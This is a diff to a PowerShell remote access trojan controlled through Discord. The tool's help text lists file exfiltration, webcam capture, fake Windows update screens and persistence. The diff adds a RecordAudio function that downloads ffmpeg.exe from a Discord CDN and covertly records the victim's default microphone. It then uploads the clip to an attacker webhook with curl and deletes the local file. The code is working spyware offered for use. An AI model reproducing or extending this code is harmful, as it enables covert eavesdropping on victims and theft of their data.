@@ -61,6 +61,7 @@ $msgsys = "``========================================================
 = Exfiltrate : Send various files. (see ExtraInfo)     =
 = Upload : Upload a file. (see ExtraInfo)              =
 = Systeminfo : Send System info as text file.          =
+= RecordAudio  : Record microphone to Discord         =
 = TakePicture : Send a webcam picture.                 =
 = FolderTree : Save folder trees to file and send.     =
 = FakeUpdate : Spoof windows update screen.            =
@@ -105,6 +106,8 @@ $msgsys = "``=========  Exfiltrate Command Examples ==================
 This Eg. will scan 192.168.1.1 to 192.168.1.254         =
 ==================  Message Example =====================
 ( Message 'Your Message Here!' )                        =
+================== Record-Audio Example =================
+( RecordAudio -t 100 ) number of seconds to record     =
 =========================================================``"
 $escmsgsys = $msgsys -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
 $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = "$escmsgsys"} | ConvertTo-Json
@@ -222,6 +225,27 @@ while ($true) {
     break
     }
 }
+}
+
+Function RecordAudio{
+param ([int[]]$t)
+$Path = "$env:Temp\ffmpeg.exe"
+If (!(Test-Path $Path)){  
+$url = "https://cdn.discordapp.com/attachments/803285521908236328/1089995848223555764/ffmpeg.exe"
+iwr -Uri $url -OutFile $Path
+}
+sleep 1
+
+Add-Type '[Guid("D666063F-1587-4E43-81F1-B948E807363F"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]interface IMMDevice {int a(); int o();int GetId([MarshalAs(UnmanagedType.LPWStr)] out string id);}[Guid("A95664D2-9614-4F35-A746-DE8DB63617E6"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]interface IMMDeviceEnumerator {int f();int GetDefaultAudioEndpoint(int dataFlow, int role, out IMMDevice endpoint);}[ComImport, Guid("BCDE0395-E52F-467C-8E3D-C4579291692E")] class MMDeviceEnumeratorComObject { }public static string GetDefault (int direction) {var enumerator = new MMDeviceEnumeratorComObject() as IMMDeviceEnumerator;IMMDevice dev = null;Marshal.ThrowExceptionForHR(enumerator.GetDefaultAudioEndpoint(direction, 1, out dev));string id = null;Marshal.ThrowExceptionForHR(dev.GetId(out id));return id;}' -name audio -Namespace system
+function getFriendlyName($id) {$reg = "HKLM:\SYSTEM\CurrentControlSet\Enum\SWD\MMDEVAPI\$id";return (get-ItemProperty $reg).FriendlyName}
+$id1 = [audio]::GetDefault(1);$MicName = "$(getFriendlyName $id1)"; Write-Output $MicName
+
+$mp3Path = "$env:Temp\AudioClip.mp3"
+if ($t.Length -eq 0){$t = 10}
+.$env:Temp\ffmpeg.exe -f dshow -i audio="$MicName" -t $t -c:a libmp3lame -ar 44100 -b:a 128k -ac 1 $mp3Path
+curl.exe -F file1=@"$mp3Path" $hookurl | Out-Null
+sleep 1
+rm -Path $mp3Path -Force
 }
 
 Function AddPersistance{
